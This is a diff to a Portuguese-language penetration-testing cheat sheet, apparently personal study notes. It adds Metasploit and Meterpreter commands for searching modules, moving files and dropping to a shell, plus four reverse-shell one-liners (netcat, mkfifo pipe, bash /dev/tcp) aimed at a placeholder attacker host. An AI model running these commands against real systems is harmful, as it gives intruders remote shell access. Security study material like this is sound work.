@@ -738,6 +738,14 @@ configuration files:
 ```
 
 # msfconsole
+
+faz/desfaz o set
+```
+unset vhost <IP>
+set vhost <IP>
+```
+
+procura por um módulo
 ```
 search eternalblue
 ```
@@ -795,9 +803,25 @@ Meterpreter permite:
 - Migração para outros processos.
 ## meterpreter
 ```
-
 search -f *key* C:\\
 ```
+
+Para fazer download e upload de um arquivo
+```
+download <file>
+upload <file>
+```
+
+whoami do meterpreter
+```
+getuid
+```
+
+utiliza a shell padrão do sistema
+```
+shell
+```
+
 # windows
 **enumerar versão**
 ```
@@ -1831,10 +1855,17 @@ Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds
 ## reverse shell
 ```
 # exemplo 1
-nc ATACKER_IP OPENNED_PORT -c /bin/bash
+nc ATTACKER_IP OPENNED_PORT -c /bin/bash
 
 # exemplo 2
-nc ATACKER_IP OPENNED_PORT -e /bin/bash
+nc ATTACKER_IP OPENNED_PORT -e /bin/bash
+
+# exemplo 3
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER OPENNED_PORT > /tmp/f
+
+# exemplo 4
+bash -i >& /dev/tcp/ATTACKER_IP/OPENNED_PORT 0>&1
+
 ```
 - `-e` Essa opção foi **removida** em versões mais recentes do `netcat`, como a do OpenBSD (`netcat-traditional` não tem `-e`)
 - `-c` Essa opção só existe em algumas versões do `netcat` (como a GNU Netcat), mas não funciona no OpenBSD `netcat`
@@ -2230,7 +2261,7 @@ nmap
 nmap -p <HTTP_PORT> --script http-methods <TARGET_IP>
 ```
 
-**curl**
+metodos com curl
 ```
 curl -v -X options <URL>
 ```
